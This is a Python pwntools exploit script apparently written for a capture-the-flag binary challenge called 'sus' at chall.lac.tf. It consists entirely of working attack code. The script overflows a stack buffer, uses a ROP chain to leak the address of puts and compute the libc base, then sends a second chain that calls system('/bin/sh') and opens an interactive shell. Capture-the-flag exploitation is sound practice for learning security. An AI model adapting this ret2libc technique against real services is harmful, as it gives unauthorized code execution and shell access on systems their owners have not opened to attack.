#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./sus_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc chall.lac.tf 31284"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

payload = b"A" * 0x38
payload += flat(
    elf.got["puts"],
    elf.bss(0xc00),
    elf.plt["puts"],
    elf.sym["_start"]
)
io.sendline(payload)
io.recvline()
puts_leak = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{puts_leak=:#x}")
libc.address = puts_leak - libc.sym["puts"]
log.info(f"{libc.address=:#x}")

binsh_str = next(libc.search(b"/bin/sh\x00"))
ret = 0x004011ac

payload = b"A" * 0x38
payload += flat(
    binsh_str,
    elf.bss(0xc00),
    ret,
    libc.sym["system"]
)
io.sendline(payload)

io.interactive()
